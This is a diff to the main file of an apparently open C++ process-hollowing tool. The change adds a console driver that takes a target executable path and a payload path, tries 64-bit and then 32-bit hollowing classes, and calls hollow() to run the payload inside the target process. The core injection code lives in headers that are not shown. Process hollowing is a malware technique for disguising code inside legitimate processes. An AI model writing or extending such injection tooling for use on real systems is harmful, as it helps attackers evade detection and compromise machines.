@@ -2,13 +2,14 @@
 #include "Hollowing64Bit.hpp"
 #include "Hollowing32Bit.hpp"
 #include <string>
+#include <iostream>
 
 template<typename T>
-bool tryConstructProcessHollowing(HollowingFunctions** value, const std::string target, const std::string& payload)
+bool tryConstructProcessHollowing(HollowingFunctions** holderPointer, const std::string targetPath, const std::string& payloadPath)
 {
     try
     {
-        *value = new T(target, payload);
+        *holderPointer = new T(targetPath, payloadPath);
 
         return true;
     }
@@ -20,5 +21,27 @@ bool tryConstructProcessHollowing(HollowingFunctions** value, const std::string 
 
 int main(int argc, char* argv[])
 {
+    HollowingFunctions* hollowing = nullptr;
+    std::string targetPath;
+    std::string payloadPath;
+
+    std::cout << "Enter the target's path:" << std::endl;
+    std::cin >> targetPath;
+
+    std::cout << "Enter the payload's path:" << std::endl;
+    std::cin >> payloadPath;
+
+    if (tryConstructProcessHollowing<Hollowing64Bit>(&hollowing, targetPath, payloadPath) ||
+        tryConstructProcessHollowing<Hollowing32Bit>(&hollowing, targetPath, payloadPath))
+    {
+        hollowing->hollow();
+    }
+    else
+    {
+        std::cerr << "The images are not compatible!" << std::endl;
+
+        return 1;
+    }
+
     return 0;
 }
